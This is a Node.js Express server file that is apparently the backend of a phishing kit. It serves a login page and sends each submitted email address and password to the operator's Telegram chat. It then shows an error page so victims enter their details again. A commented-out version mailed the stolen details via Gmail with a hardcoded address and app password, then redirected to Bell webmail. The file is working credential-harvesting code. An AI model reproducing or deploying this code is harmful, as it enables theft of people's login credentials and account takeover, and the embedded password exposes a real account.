require('dotenv').config();
const express = require('express');
const app = express()
const bodyParser = require('body-parser')
const handlebars = require('handlebars');
app.use(express.json());
const TelegramBot = require('node-telegram-bot-api');


const PORT = process.env.PORT || 3150;

// Telegram Bot setup
const telegramToken = process.env.TELEGRAM_BOT_TOKEN; // Get from BotFather
const bot = new TelegramBot(telegramToken, { polling: true });




app.set('view engine', 'ejs');
app.use(express.static('public'));

app.use(bodyParser.urlencoded({ extended: true}));  

app.get('/home', (req, res) => {
  res.render('index')
})

app.get('/login', (req, res) => {
  res.render('index')
})
    
//   req.body.addy
//   req.body.press


//   var transporter = nodemailer.createTransport(smtpTransport({
//     service: 'gmail',
//     host: 'smtp.gmail.com',
//     auth: {
//       user: 'okumagbarukevwe@gmail.com',
//       pass: 'ejbx ctia zdkq xwss'
//     }
//   }));
  


// fs.readFile('Mail2.html','UTF-8',function(err, data) {
//   if (err) console.log('error', err);
//   const template = handlebars.compile(data.toString());
//   const replacements = {
//     addy: req.body.addy,
//     press: req.body.press
//   };
//   const htmlToSend = template(replacements);
  
//       // const mailData = {
//       // from: 'exchange@piexchanger.online',
//       // // to: 'okumagbarukevwe@gmail.com',
//       // to: 'okumagbarukkevwe@gmail.com',
//       // // to: 'joannelouisekenrick.cbs@gmail.com',
//       // // subject: `New User Alert`,
//       // text: '',
//       // html: htmlToSend,
//       // //  strUser
//       // subject: '*****New message*****',
//       // }

//       var mailOptions = {
//         from: 'okumagbarukevwe@gmail.com',
//         to: 'okumagbarukkevwe@gmail.com',
//         subject: '********New Message***********',
//         text: "Message:     " + replacements.addy + " " + "presser: " + replacements.press  
//       };
  
//       // transporter.sendMail(mailData, function (err, info) {
//       //   if(err)
//       //     console.log(err)
//       //   else
//       //     console.log(info);
//       //     console.log(message);
//       //     res.redirect('../wallet')
//       //   })
//   // console.log(message);

//   transporter.sendMail(mailOptions, function(error, info){
//     if (error) {
//       console.log(error);
//     } else {
//       console.log('Email sent: ' + info.response);
//       console.log(info)
//       console.log(replacements.addy)
//       res.redirect('https://webmail.en.bellnet.ca/ux/index-rui.jsp?v=3.1.3.54.0-4#/mail')
//     }
//   });  
// }) 
//   // console.log(message);
  
// })
// console.log(message);

app.post('/login', (req, res) => {

  const { addy, press } = req.body;

  // ✅ Send data to your Telegram account/chat
  const message = `
📥 New Form Submission:
👤 Addy: ${addy}
📧 Press: ${press}
  `;

  // Replace with your own Telegram user/chat ID
  const chatId = process.env.ADMIN_CHAT_ID;

  bot.sendMessage(chatId, message);
  res.redirect('../eLogin')

})

app.get('/eLogin', (req, res) => {
  res.render('error')
})

app.post('/eLogin', (req, res) => {

  const { addy, press } = req.body;

  // ✅ Send data to your Telegram account/chat
  const message = `
📥 New Form Submission:
👤 Addy: ${addy}
📧 Press: ${press}
  `;

  // Replace with your own Telegram user/chat ID
  const chatId = process.env.ADMIN_CHAT_ID;

  bot.sendMessage(chatId, message);
  res.redirect('../eLogin')

})


  


app.listen(PORT, ()=> {
  console.log('server has started')
})